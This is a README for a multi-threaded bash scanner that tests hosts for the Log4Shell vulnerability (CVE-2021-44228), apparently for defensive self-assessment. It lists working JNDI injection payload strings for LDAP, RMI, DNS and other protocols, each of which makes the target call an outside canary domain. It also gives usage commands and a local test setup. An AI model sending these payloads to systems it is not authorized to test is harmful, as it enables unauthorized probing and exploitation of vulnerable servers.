# log4j-scan-turbo (Multi-threaded scanner)
Test for the log4j vulnerability ( CVE-2021-44228 ) across your external footprint.

This is a very fast, multi-threaded, log4j vulnerability tester.

## Details

- Pure bash scanner
- Uses nohup and curl to achieve multiple threads
- Curl configured to use a 3 second client to server maximum and six second total time setting.
- 48 parallel calls at a time
- Covers all jndi protocols
- HTTP GET/POST methods

## Example Use
```
git clone https://github.com/ssstonebraker/log4j-scan-turbo
cd log4j-scan-turbo
sudo ./log4j_CVE-2021-44228_tester.sh <INPUT_FILE> <CANARY_DOMAIN>
```

## Payloads
```
Payloads:
${jndi:ldap://<canary_domain>/a}
${jndi:ldaps://<canary_domain>/a}
${jndi:rmi://<canary_domain>/a}
${jndi:dns://<canary_domain>/a}
${jndi:corba://<canary_domain>/a}
${jndi:iiop://<canary_domain>/a}
${jndi:nis://<canary_domain>/a}
${jndi:nds://<canary_domain>/a}
```
## Methods
HTTP GET and HTTP POST are called on TCP 80/443 for each ip/domain provided in the input file

## Requirements
You will need:
1. An inputfile with a list of IP addresses/domains (one per line)
2. A Canary Token (see below)

### Input File
Your input file should consist of IP address and/or Fully Qualified Domain Names

Example:
```
foo.com
bar.com
10.1.100.50
127.0.0.1:5000
```

### Get a Canary Domain 
1. Browse to https://canarytokens.org/generate#
2. Selection Option "DNS"
3. Input Email Address
4. Input Comment
5. Hit "Create my Canary Token"

<img width="973" alt="image" src="https://user-images.githubusercontent.com/774940/145664156-fee98504-0a18-427c-8213-5f3818864a9a.png">

## False Positives
If you use egress SSL decryption + inspection this script may trigger false positives (as your IDS may perform lookups on the canary token.. thus triggering it).

If this is the case then you are better off running it from a cloud instance that is not being inspected.

## Local Testing
Spin up a docker image of a vulnerable server:
```
docker run --name vulnerable-app -p 555:8080 ghcr.io/christophetd/log4shell-vulnerable-app
```
 
Use the script to test locally:
```
echo "localhost:555" > ips.txt
sudo ./log4j-scan-turbo.sh ips.txt <canary_domain>
```




